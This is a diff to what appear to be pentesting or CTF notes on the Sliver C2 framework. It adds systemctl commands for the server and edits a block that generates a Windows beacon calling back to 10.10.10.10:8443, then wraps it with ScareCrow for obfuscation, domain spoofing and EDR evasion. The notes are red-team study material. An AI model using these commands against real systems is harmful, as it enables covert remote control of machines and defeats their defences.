@@ -68,8 +68,12 @@ EOL
 sudo sliver
 sudo su - ; /root/sliver-server
 sliver-server
-systemctl <cmd> sliver
 
+// Start sliver with systemctl
+systemctl status sliver
+systemctl start sliver
+systemctl enable sliver
+// Then the binary
 sliver
 
 // Display help
@@ -200,7 +204,7 @@ Shellcode generation
 [[ScareCrow]] and `upx` for the CTF-level bypass of EDR - [Alh4zr3d](https://www.youtube.com/@alh4zr3d3)
 ```bash
 # Generate sliver beacon shellcode disabling shikata ga nai
-generate beacon --mtls  10.10.10.10:8443 --arch amd64 --os windows --save /tmp/8443-sliver.bin -f shellcode -G
+generate beacon --mtls  10.10.10.10:8443 --arch amd64 --os windows --save /tmp/8443-sliver.bin -f shellcode
 # use 
 /opt/ScareCrow/ScareCrow -I /tmp/8443-sliver.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
 # Add For static without c runtime libraries
